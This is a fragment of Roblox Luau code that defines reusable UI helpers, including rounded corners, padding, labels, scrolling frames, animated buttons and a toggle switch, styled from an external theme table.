local function corner(i, r) local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,r or 6); c.Parent=i; return c end
local function stroke(i,col,th) local s=Instance.new("UIStroke"); s.Color=col or T.BDR; s.Thickness=th or 1; s.Parent=i; return s end
local function pad(i,t,r,b,l) local p=Instance.new("UIPadding"); p.PaddingTop=UDim.new(0,t or 6); p.PaddingRight=UDim.new(0,r or 6); p.PaddingBottom=UDim.new(0,b or 6); p.PaddingLeft=UDim.new(0,l or 6); p.Parent=i; return p end
local function ll(i,gap,dir,ha) local l=Instance.new("UIListLayout"); l.Padding=UDim.new(0,gap or 4); l.FillDirection=dir or Enum.FillDirection.Vertical; l.HorizontalAlignment=ha or Enum.HorizontalAlignment.Left; l.SortOrder=Enum.SortOrder.LayoutOrder; l.Parent=i; return l end
local function lbl(p,txt,sz,col,fnt,xa)
    local l=Instance.new("TextLabel"); l.BackgroundTransparency=1; l.Text=txt or ""; l.TextSize=sz or 13
    l.TextColor3=col or T.TXT; l.Font=fnt or Enum.Font.GothamBold; l.TextXAlignment=xa or Enum.TextXAlignment.Left
    l.TextTruncate=Enum.TextTruncate.AtEnd; l.Parent=p; return l
end
local function sf(p,sz,pos)
    local s=Instance.new("ScrollingFrame"); s.Size=sz or UDim2.new(1,0,1,0); if pos then s.Position=pos end
    s.BackgroundTransparency=1; s.BorderSizePixel=0; s.ScrollBarThickness=5; s.ScrollBarImageColor3=T.SCR
    s.CanvasSize=UDim2.new(0,0,0,0); s.AutomaticCanvasSize=Enum.AutomaticSize.Y; s.Parent=p; return s
end
local function sep(p)
    local f=Instance.new("Frame"); f.Size=UDim2.new(1,-12,0,1); f.BackgroundColor3=T.BDR; f.BorderSizePixel=0; f.Parent=p; return f
end

local function btn(p, txt, bg, fg, sz, pos)
    local b = Instance.new("TextButton")
    b.Size = sz or UDim2.new(0,100,0,30); if pos then b.Position=pos end
    b.BackgroundColor3 = bg or T.ACC; b.TextColor3 = fg or T.TXT
    b.Font = Enum.Font.GothamBold; b.TextSize = 12; b.Text = txt or ""
    b.AutoButtonColor = false; b.BorderSizePixel = 0; b.Parent = p; corner(b, 6)
    local base = bg
    b.MouseEnter:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=Color3.new(math.min(base.R+0.09,1),math.min(base.G+0.09,1),math.min(base.B+0.09,1))}):Play() end)
    b.MouseLeave:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=base}):Play() end)
    b.MouseButton1Down:Connect(function() TweenService:Create(b,TweenInfo.new(0.06),{BackgroundColor3=Color3.new(math.max(base.R-0.09,0),math.max(base.G-0.09,0),math.max(base.B-0.09,0))}):Play() end)
    b.MouseButton1Up:Connect(function() TweenService:Create(b,TweenInfo.new(0.1),{BackgroundColor3=base}):Play() end)
    return b
end

local function toggle(p, labelTxt, init, onChange)
    local ctr = Instance.new("Frame"); ctr.Size=UDim2.new(1,0,0,28); ctr.BackgroundTransparency=1; ctr.Parent=p
    local l = lbl(ctr, labelTxt, 12, T.TXT, Enum.Font.Gotham); l.Size=UDim2.new(1,-54,1,0)
    local track = Instance.new("Frame"); track.Size=UDim2.new(0,44,0,22); track.Position=UDim2.new(1,-44,0.5,-11)
    track.BackgroundColor3=init and T.ACC or T.BG3; track.Parent=ctr; corner(track,11); stroke(track,T.BDR)
    local knob = Instance.new("Frame"); knob.Size=UDim2.new(0,16,0,16)
    knob.Position=init and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)
    knob.BackgroundColor3=T.TXT; knob.Parent=track; corner(knob,8)
    local state=init
    local hb=Instance.new("TextButton"); hb.Size=UDim2.new(1,0,1,0); hb.BackgroundTransparency=1; hb.Text=""; hb.Parent=ctr
    hb.MouseButton1Click:Connect(function()
        state=not state
        TweenService:Create(track,TweenInfo.new(0.18),{BackgroundColor3=state and T.ACC or T.BG3}):Play()
        TweenService:Create(knob,TweenInfo.new(0.18),{Position=state and UDim2.new(1,-19,0.5,-8) or UDim2.new(0,3,0.5,-8)}):Play()
        if onChange then onChange(state) end
    end)
    return ctr
end

